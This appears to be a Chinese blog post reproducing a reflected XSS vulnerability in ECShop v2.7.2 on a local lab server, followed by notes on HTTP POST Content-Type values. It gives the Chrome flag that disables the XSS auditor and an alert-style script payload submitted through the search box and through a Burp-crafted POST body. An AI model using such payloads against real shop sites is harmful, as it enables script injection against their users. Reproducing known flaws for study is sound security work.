---
title: ecshop XSS 复现
date: 2019-08-17 13:35:05
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - 漏洞复现
    - XSS
    - ecshop
---

# 0x01 前言
使用Chrome调试XSS漏洞，需要关闭XSS过滤器,才能成功弹窗

`"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --args --disable-xss-auditor`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008215335.png)

# 0x02 复现
本地搭建ECShop v2.7.2 ，php版本5.3及以下，否则会报各种各样的错

访问`http://192.168.1.6/article_cat.php?id=1`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220513.png)

搜索框输入`1\\\"><script>alert(123)</script>`提交，成功弹窗

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220738.png)

burpsuite抓包POST提交，记得添加

`Content-Type: application/x-www-form-urlencoded`

`keywords=1234567\\\"><script>alert(123456)</script>&id=1&cur_url=http://127.0.0.1/article_cat.php?id=1`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220925.png)

# 0x03 总结

这里总结一下常用POST请求类型

* raw 原始类型，可以上传任意格式的文本，比如 text、json、xml、html

```
该编码类型的表单，必须通过AJAX技术
JSON: application/json
XML: text/xml
纯文本: text/plain
html: text/html
```

* application/x-www-form-urlencoded，会将表单内的数据转换拼接成 key-value 对（非 ASCII 码进行编码）
  URLencoded: application/x-www-form-urlencoded

```
HTML中<form>标签的enctype属性用来指定表单编码格式，默认为application/x-www-form-urlencoded
请求头:（这里只给出了Content-Type字段）：
POST http://www.example.com HTTP/1.1
Content-Type: application/x-www-form-urlencoded
```

* multipart/form-data，将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件

```
请求头：
POST http://www.example.com HTTP/1.1
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA
```

# 参考文章
[关闭谷歌chrome xss过滤器](https://blog.csdn.net/shiyuqing1207/article/details/46430017)
[http 请求头的几种Content-type](https://blog.csdn.net/jesse_cool/article/details/86608816)